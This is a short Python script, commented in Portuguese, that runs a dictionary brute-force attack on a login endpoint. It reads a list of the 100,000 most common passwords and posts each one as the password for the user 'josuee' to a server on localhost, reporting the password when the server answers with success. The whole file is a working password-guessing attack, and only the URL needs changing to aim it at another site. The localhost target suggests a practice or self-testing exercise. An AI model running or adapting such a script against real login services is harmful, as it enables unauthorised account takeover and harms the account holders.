import requests
import json
import time

with open('100kMostUsed.txt', 'r', encoding='utf-8') as file:
    rows = [(row.strip(), row_number) for row_number, row in enumerate(file, start=1)]

url = "http://localhost:3000/"
start_time = time.time()


for row in rows:
    try:
        response = requests.post(url, json={"login": "josuee", "password": row[0]}, headers={"Content-Type": "application/json"})

        if response.status_code == 200:
            print(f"Logado com sucesso!")
            end_time = time.time()
            elapsed_time = end_time - start_time
            print(f"Tempo decorrido: {elapsed_time:.2f} segundos, senha é {row[0]}")
            break
        else:
            if row[1] % 10 == 0:
                print(f"{row[1]} senhas testadas")

    except Exception as e:
        print(f"Erro ao enviar requisição: {e}")

# Se não encontrou a senha correta
else:
    print("Senha não encontrada.")

# O restante do seu código continua aqui...
